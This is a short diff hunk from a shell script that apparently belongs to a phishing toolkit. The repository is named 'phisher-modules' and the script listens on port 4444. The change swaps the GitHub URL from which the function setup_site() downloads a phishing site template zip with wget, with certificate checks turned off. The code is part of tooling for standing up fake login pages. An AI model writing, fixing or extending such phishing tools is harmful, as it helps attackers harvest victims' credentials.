@@ -434,7 +434,7 @@ PORT='4444'
 setup_site() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Downloading site..."${WHITE}
 	zipfullname=$zipname".zip"
-	zipurl="https://raw.githubusercontent.com/RDXLR/phisher-modules/main/csites/"$zipfullname
+	zipurl="https://github.com/RDXLR/phisher-modules/raw/main/csites/"$zipfullname
 	wget --no-check-certificate "$zipurl" > /dev/null 2>&1
 	if [ -e $zipfullname ]; then
 	        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Site downloaded sucesssfully..."${WHITE}
